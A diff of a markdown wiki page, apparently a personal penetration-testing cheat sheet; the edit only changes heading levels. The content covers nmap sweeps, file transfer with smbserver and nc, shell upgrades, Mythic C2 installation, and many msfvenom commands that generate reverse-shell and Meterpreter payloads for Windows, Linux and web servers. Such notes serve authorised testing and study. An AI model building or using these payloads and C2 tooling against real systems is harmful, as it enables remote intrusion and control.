@@ -7,8 +7,8 @@ classes: wide
 permalink: /wiki
 ---
 
-## tmux
-### tmux commands
+# TMUX
+## tmux commands
 
 ```
 tmux: opens tmux
@@ -25,7 +25,7 @@ PREFIX + %: split pane vertically
 PREFIX + ": split pane horizontally
 ```
 
-### tmux essentials
+## tmux essentials
 
 ```
 tmux attach -t <name>: attach back into a session
@@ -34,7 +34,7 @@ tmux source-file ~/.tmux.conf: reload .tmux.conf
 tmux ls: show all tmux sessions
 ```
 
-### tmux-logging
+## tmux-logging
 
 ```
 Logging: prefix + shift + p
@@ -43,9 +43,9 @@ Save all history: prefix + alt + shift + p
 Clear pane history: prefix + alt + c
 ```
 
-## NMAP
+# NMAP
 
-### find nmap scripts
+## find nmap scripts
 
 ```
 locate <service/keyword> | grep .nse$
@@ -53,7 +53,7 @@ locate <service/keyword> | grep .nse$
 locate *.nse | grep <service/keyword>
 ```
 
-### network sweep
+## network sweep
 ```
 nmap -sn <IP block>
 ```
@@ -62,9 +62,9 @@ nmap -sn <IP block>
 sudo arp-scan --interface=eth0 192.168.182.0/24
 ```
 
-## FILE TRANSFER
+# FILE TRANSFER
 
-### smb
+## smb
 
 ```
 smbserver.py -smb2support <share name> .
@@ -75,14 +75,14 @@ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All if
 **set-executionpolicy remotesigned to enable running scripts
 ```
 
-### nc
+## nc
 
 ```
 RECIEVING END: nc -l -p <port> > <file>
 SENDING END: nc -w 3 <IP> <port> < lse1.txt
 ```
 
-### python
+## python
 
 ```
 Python 2: python -m SimpleHTTPServer <port>
@@ -91,8 +91,8 @@ Python 3: python -m http.server <port>
   > --bind <specific IP>
 ```
 
-## FULL FUNCTONING SHELL
-### spawn tty shell
+# FULL FUNCTONING SHELL
+## spawn tty shell
 
 ```
 which python
@@ -108,8 +108,8 @@ reset
 paste $TERM value
 ```
 
-## PORT FORWARDING
-### ssh port forwarding
+# PORT FORWARDING
+## ssh port forwarding
 
 **DO THIS ON THE MACHINE THAT YOU WANT TO PORT FORWARD TO (AKA YOUR HOST)**
 
@@ -117,11 +117,11 @@ paste $TERM value
 ssh -L <local port>:<local IP>:<remote port> <remote user>@<remote domain/ip>
 ```
 
-## INSTALLATIONS
+# INSTALLATIONS
 
-### C2
+## C2
 
-#### Mythic
+### Mythic
 
 ```
 git clone https://github.com/its-a-feature/Mythic
@@ -135,19 +135,19 @@ sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
 sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http.git
 ```
 
-#### Covenant
+### Covenant
 
 ```
 
 ```
 
-### jVis
+## jVis
 
 ```
 
 ```
 
-### Docker
+## Docker
 
 ```
 DOCKER
@@ -161,7 +161,7 @@ sudo chmod +x /usr/local/bin/docker-compose
 sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose (if docker-compose no worky)
 ```
 
-## AutoRecon
+# AutoRecon
 
 ```
 autorecon <IP 1> <IP 2> -o <output location>
@@ -170,13 +170,13 @@ autorecon <IP 1> <IP 2> -o <output location>
   > autorecon -t <target file>
 ```
 
-## METASPLOIT
+# METASPLOIT
 
-### msfvenom
+## msfvenom
 
-#### Non-Meterpreter
+### Non-Meterpreter
 
-##### **Windows**
+#### **Windows**
 
 ```
 STAGED
@@ -190,7 +190,7 @@ x86: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shel
 x64: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
-##### **Linux**
+#### **Linux**
 
 ```
 STAGED
@@ -204,7 +204,7 @@ x86: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > sh
 x64: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
-##### **Web**
+#### **Web**
 
 ```
 asp: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
@@ -213,9 +213,9 @@ war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > she
 php: msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
-#### Meterpreter
+### Meterpreter
 
-##### Windows
+#### Windows
 
 ```
 STAGED
@@ -229,7 +229,7 @@ x86: msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe 
 x64: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
-##### Linux
+#### Linux
 
 ```
 STAGED
@@ -243,7 +243,7 @@ x86: msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f el
 x64: msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
-##### Web
+#### Web
 
 ```
 asp: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
